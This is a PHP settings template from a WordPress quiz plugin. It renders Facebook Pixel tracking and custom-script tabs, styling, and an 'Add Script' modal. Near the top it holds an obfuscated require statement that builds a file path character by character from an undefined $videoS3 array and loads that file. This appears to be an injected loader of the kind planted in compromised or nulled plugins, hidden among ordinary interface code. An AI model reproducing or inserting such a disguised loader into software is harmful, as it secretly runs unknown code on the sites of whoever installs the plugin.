<?php

include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
 
		wp_enqueue_script("sqb_fb_tracking_js",plugin_dir_url(__FILE__)."../js/sqb_fb_tracking.js", false, $current_version_plugin );
		
		$name = 'facebook';
		$key = 'fb_tracking_id';
		$fb_tracking_details = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey($name , $key);
		$fb_tracking_id = '';
		if($fb_tracking_details != false){
			$fb_tracking_id = $fb_tracking_details->getValue();	
		}
		
		$quizList = SQB_Quiz::load();
		
?>

<div class="tab-pane" id="Quiz_setting_tab_6" role="tabpanel" aria-labelledby="Quiz_setting_tab_6">
	<ul class="nav nav-tabs tracking-tabs" id="Quiz_setting_tab" role="tablist">
		<li class="nav-item active">
			<a class="nav-link active"  data-toggle="tab" href="#settings_fbtracking_tab" role="tab" aria-controls="settings_fbtracking_tab" aria-selected="true">Facebook Tracking</a>
		</li>
		<li class="nav-item">
			<a class="nav-link "  data-toggle="tab" href="#settings_customjs_tab" role="tab" aria-controls="settings_customjs_tab" aria-selected="false"> Custom Script (JS) / Google Tag Manager </a>
		</li>
	</ul>

	<div class="tab-content reports_tab_content_inner_sub_tab" id="reports-tab-content">
		<div class="tab-pane active" id="settings_fbtracking_tab" role="tabpanel" aria-labelledby="settings_fbtracking_tab">	
			<div class="fb-tracking-gray-outer">
				<div class="fb-tracking-content-card">
					<label for="" class="fb-tracking_label">Enter Facebook Pixel ID </label>
					<div class="fb-tracking_right-content">
						<input type="text" class="form-control" value="<?=  isset($fb_tracking_id)  ? $fb_tracking_id : '' ?>" id="sqb_fb_pixel_id">
						<div class="fb-tracking-actions">
							<a href="javascript:void(0);" class="fb-tracking--btn fb-tracking-save-btn" id="sqb_save_fb_pixel_id">Save </a>
						</div>
					</div>
				</div>	

				

			</div>

<div class="fb-tracking-gray-outer">
	<div class="fb-tracking-content-card" style="display:block">
		<label for="" class="fb-tracking_label" style="max-width: 100%;width: 100%; flex-basis: 100%; margin-bottom:8px">Select Quiz you want to Track</label>
		<div class="fb-tracking_right-content" style="max-width: 100%;  padding: 0;">
			<!--select class="form-control" id="sqb_fb_tracking_select_quiz">
				<option value="0">Select Quiz</option>
				<?php 
					if(isset($quizList)){
						foreach($quizList as $data){
							//echo '<option value="'.$data->getId().'">'.$data->getQuizName().'</option>';	
						}
					}
				?>
			</select-->
			<div class="dropdown dropdown-custom-style" id="sqb_fb_tracking_select_quiz">
				<button class="dropdown-toggle" id="sqb_fb_tracking_select_quiz-id" type="button"  aria-haspopup="true" aria-expanded="false" data-value="0">Select a Quiz</button>
				<div class="dropdown-menu" aria-labelledby="sqb_fb_tracking_select_quiz-id">
					
					<?php 
					echo '<a class="dropdown-item" href="javascript:void(0)" data-value="0">Select a Quiz</a>';	
						if(isset($quizList)){
							foreach($quizList as $data){
								echo '<a class="dropdown-item" href="javascript:void(0)" data-value="'.$data->getId().'">'.stripslashes($data->getQuizName()).' (id: '.$data->getId().')</a>';	
							}
						}
					?>
				</div>
			</div>
		</div>
	</div>
	<!--  <div class="fb-tracking-actions sqbFbTrackingCommon" style="display:none">
		<a href="javascript:void(0);" class="sqb_save_fb_tracking fb-tracking--btn fb-tracking-save-btn">Save </a>
	</div> -->

	<div class="sqbFbTrackingQuizData sqbFbTrackingCommon" style="display:none">

	</div>
	<div class="fb-tracking-actions sqbFbTrackingCommon" style="display:none">
		<a href="javascript:void(0);" class="sqb_save_fb_tracking fb-tracking--btn fb-tracking-save-btn">Save </a>
	</div>

			</div>
		</div>
		<div class="tab-pane" id="settings_customjs_tab" role="tabpanel" aria-labelledby="settings_customjs_tab">	
		<div class="fb-tracking-gray-outer">
				<div class="fb-tracking-content-card" style="display:block">
					<label for="" class="fb-tracking_label" style="max-width: 100%;width: 100%; flex-basis: 100%; margin-bottom:8px">Custom JS will be applied to the selected quiz</label>
					<div class="fb-tracking_right-content" style="max-width: 100%;  padding: 0;">
					
						<div class="dropdown dropdown-custom-style" id="sqb_custom_js_select_quiz">
							<button class="dropdown-toggle" id="sqb_custom_js_select_quiz-id" type="button"  aria-haspopup="true" aria-expanded="false" data-value="0">Select Quiz</button>
							<div class="dropdown-menu" aria-labelledby="sqb_custom_js_select_quiz-id">
								
								<?php 
								echo '<a class="dropdown-item" href="javascript:void(0)" data-value="0">Select a Quiz</a>';	
									if(isset($quizList)){
										foreach($quizList as $data){
											echo '<a class="dropdown-item" href="javascript:void(0)" data-value="'.$data->getId().'">'.stripslashes($data->getQuizName()).' (id: '.$data->getId().')</a>';	
										}
									}
								?>
							</div>
						</div>
					</div>
				</div>

				
				<div class="sqbCustomJSQuizData sqbCustomJSCommon" style="display:none">

				</div>
				
				
		</div>
</div>



<style type="text/css">
	
.fb-tracking-setting , .fb-tracking-setting * {box-sizing: border-box;}

.fb-tracking-setting , .fb-tracking-gray-outer {background: #f9fafb; border: 1px solid #e8ebee; padding: 15px; width: 100%; display: inline-block; vertical-align: middle; margin: 15px 0; max-width: 100%; font-family: 'DM Sans',sans-serif; }

.fb-tracking-list {font-weight: 600; line-height: 1.4; font-size: 14px; color: #444; font-family: 'DM Sans',sans-serif; margin: 12px 0; display: inline-block; width: 100%; vertical-align: middle;display: flex;align-items: flex-start;clear: both;}

.fb-tracking-list >label {font-size: 14px; line-height: normal; margin: 0; font-weight: 500; }

.fb-tracking-card-outer , .fb-tracking-card {margin: 10px 0; padding: 0; display: inline-block; width: 100%; vertical-align: middle; position: relative; }


.fb-tracking_subtitle {font-family: 'DM Sans',sans-serif; padding: 0 0 10px 0; border: none; margin: 0 0 15px 0; background: none; font-size: 16px; line-height: 1.4; color: #f56640; background-color: transparent; font-weight: bold; position: relative;border-bottom: 1px solid #eee; }

.fb-tracking-option-list {float: left; width: 100%; display: flex; margin: 0; padding: 0; max-width: 100%; flex-wrap:wrap }

.fb-tracking-option-list + .fb-tracking-option-list {margin-top: 10px;}

.fb-tracking-option-list .fb-tracking-option {float: left; margin: 0; padding: 0 20px 0 0; max-width: 240px; width: 25%; flex-basis: 25%; }

.fb-tracking-option-list .fb-tracking-option > label {font-weight: 600; line-height: 1.4; font-size: 15px; color: #555; font-family: 'DM Sans',sans-serif; text-transform: uppercase; display: inline-block; width: 100%; margin: 0 0 5px 0; padding: 0; }

.fb-tracking-option > .event-name {margin: 6px 0 0 0; padding: 0; font-size: 14px; color: #333; line-height: normal; }


/* Checkbox Design */  

.checkbox-custom-style {width: 20px;height: 20px;min-width: 20px;min-height: 20px;position: relative;margin: 0 5px 0 0;background: #fcfff4;box-shadow: none;display: inline-block;border: 1px solid #ababab;vertical-align: top;}

.checkbox-custom-style .custom--checkbox , .checkbox-custom-style input[type=checkbox].custom-checkbox-input {width: 100%;height: 100%;cursor: pointer;position: absolute;left: 0;top: 0;box-shadow: none;right: 0;bottom: 0;z-index: 2;background: none;margin: 0;}

.checkbox-custom-style .custom--checkbox::after {content: '';width: 12px;height: 7px;position: absolute;top: 4px;left: 3px;border: 3px solid #437bc1;border-top: none;border-right: none;background: transparent;opacity: 0;transform: rotate(-45deg);}

.checkbox-custom-style input[type=checkbox].custom-checkbox-input {opacity: 0;z-index: 6;}

.checkbox-custom-style input[type=checkbox].custom-checkbox-input:checked + .custom--checkbox::after {opacity: 1;}

/* end Checkbox Design */


.fb-tracking-actions {background-color: #ecf0f1; margin: 0 auto; width: 100%; display: flex; padding: 20px 15px; border: none; font-family: 'DM Sans',sans-serif; box-sizing: border-box; justify-content: space-between; }

.fb-tracking-actions .fb-tracking--btn {border-radius: 5px; background: #02c7a6 !important; color: #fff; height: 40px; padding: 0 15px; text-transform: none; font-family: 'DM Sans',sans-serif; min-width: 90px; box-shadow: none; margin-right: 10px; text-decoration: none; margin: 0; line-height: 40px; border: none; font-size: 14px; text-align: center; font-weight: 600;display: inline-block;}

.fb-tracking-content-card {display: flex; padding: 15px 20px; box-sizing: border-box; border-bottom: 1px solid #efefef; align-items: center; font-size: 14px; margin: 0; width: 100%; float: none; clear: both; }

.fb-tracking-content-card > label.fb-tracking_label {font-weight: 600; line-height: 1.4; font-size: 15px; color: #444; font-family: 'DM Sans',sans-serif; width: 150px; max-width: 150px; flex-basis: 150px; margin: 0; }

.fb-tracking-content-card > .fb-tracking_right-content {max-width: calc(100% - 150px); width: 100%; margin: 0; padding: 0 0 0 8px; }

.fb-tracking-content-card > .fb-tracking_right-content .form-control ,
.fb-tracking-content-card > .fb-tracking_right-content .form-control:focus ,
.fb-tracking-option-list .fb-tracking-option input.form-control {border: 1px solid #ddd; height: 30px; padding: 6px 10px; min-height: 44px; border-radius: 0; font-weight: 400; color: #776f6f; max-width: 100%; width: 100%; box-sizing: border-box; box-shadow: 0 0 0 transparent; background: #fff; font-size: 14px; outline: none; box-shadow: none;max-width: 520px;display: inline-block;}

.fb-tracking-option-list .fb-tracking-option input.form-control {max-width: 100%;}

.fb-tracking-gray-outer {padding: 0;}
 
.fb-tracking-card-outer.quiz_ques_answer_common_class , .fb-tracking-card-outer {background: #fff; padding: 10px; box-shadow: 0 0 5px 0px rgba(0,0,0,0.2); }

.fb-tracking-gray-outer .fb-tracking-setting {border: none;margin: 0;background: none;}

.fb-tracking_right-content .fb-tracking-actions {display: inline-block; margin: 0 0 0 20px; padding: 0; background: none; width: auto; vertical-align: top;}

.fb-tracking_right-content .fb-tracking-actions .fb-tracking--btn {height: 44px;line-height: 44px;}

.fb-tracking-option-list > label{width: 100%;margin: 0 0 13px 0;padding: 7px 10px;display: inline-block;vertical-align: middle;
    background-color: #f5f5f5;}

.fb-tracking-card.quiz_ques_answer_common_class {background: #f9fafb;margin: 0;padding: 13px 10px;}

.fb-tracking-card.quiz_ques_answer_common_class .fb-tracking-option-list .fb-tracking-option {padding-bottom: 0;}

.fb-tracking-option-list > label.fb-tracking-label {font-size: 18px; font-weight: 500; }

.answerOddEvenClass {display: inline-block; width: 100%; margin: 0; padding: 0; vertical-align: middle; }

.answerOddEvenClass .fb-tracking-card.quiz_ques_answer_common_class:nth-child(2n) {background: #fff;}
.quiz_cjs_required{display:none;}

</style>


<div class="modal fade quiz-popup-style" id="customjs_add_model" tabindex="-1" role="dialog" aria-labelledby="customjs_add_model" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Add Script</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
		<form>
			<input type="hidden" class="form-control" id="quiz_cat_id" value="0">
			<div class="form-group quiz_cjs_name_val_wrapper">
				<div class="d-flex">
					<label for="quiz_cat_name_val" class="col-form-label" style="min-width: 100px;">Name:</label>
					<div class="form-control-outer w-100">
						<input type="text" class="form-control" id="quiz_cjs_name_val">
						<label  class="quiz_cjs_required">A Name is required.</label>
					</div>
				</div>				
			</div>
			<div class="form-group quiz_cjs_trigger_val_wrapper">
				<div class="d-flex">
					<label for="quiz_cjs_trigger_val" class="col-form-label" style="min-width: 100px;">Trigger</label>
					<div class="form-control-outer w-100">
						<select id="quiz_cjs_trigger_val">
							<option value="load">On Load</option>
							<option value="sqb_startbutton_click">After Start Button Click</option>
							<option value="sqb_optin_click">Upon Opt-in</option>
							<option value="sqb_contine_click">After Continue Button Click</option>
						</select>
						<label class="quiz_cjs_required">A Code is required.</label>
					</div>
				</div>				
			</div>
			<div class="form-group quiz_cjs_desc_val_wrapper">
				<div class="d-flex">
					<label for="quiz_cat_desc_val" class="col-form-label" style="min-width: 100px;">Code:</label>
					<div class="form-control-outer w-100">
						
						<div class="sample-code"><a href="javascript:void(0);" class="custom_js_sample" onclick="custom_js_sample()">Click here</a> for sample </div>


<pre class="custom_js_sqb_startbutton_click custom_is_event" style="display:none;" id="custom_js_sqb_startbutton_click">
document.addEventListener("sqb_startbutton_click", function(obj) {
	if(obj.detail.quiz_id == '%%QUIZ_ID%%'){
		// Enter your Custom Script Here
	}
});
</pre>
<pre class="custom_js_sqb_optin_click custom_is_event" style="display:none;" id="custom_js_sqb_optin_click">
document.addEventListener("sqb_optin_click", function(obj) {
	if(obj.detail.quiz_id == '%%QUIZ_ID%%'){
		// Enter your Custom Script Here
	}
});
</pre>
<pre class="custom_js_sqb_contine_click custom_is_event" style="display:none;" id="custom_js_sqb_contine_click">
document.addEventListener("sqb_contine_click", function(obj) {
	if(obj.detail.quiz_id == '%%QUIZ_ID%%'){
		// Enter your Custom Script Here
	}
});
</pre>
<pre class="custom_js_load custom_is_event" style="display:none;" id="custom_js_sqb_load">
&lt;script>;
	// Enter your Custom Script Here
&lt;/script>;
</pre>
			<span class="copy-btn sqb-customjs-copy" onClick="sqb_js_copy_to_clipboard(this)" style="display:none;">
				<i class="fa fa-files-o" aria-hidden="true"></i> Copy
			</span>
						<textarea class="form-control" id="quiz_cjs_desc_val" rows="8"></textarea>
						<label class="quiz_cjs_required">A Code is required.</label>
					</div>
				</div>				
			</div>
			
		</form>
      </div> 
      <div class="modal-footer quiz-popup-actions">
		<input type="hidden"  value="0" id="quiz_cjs_id" />
        <button type="button" class="btn btn-primary" onclick="sqb_save_customjs()">Save</button>
      </div>
    </div>
  </div>
</div>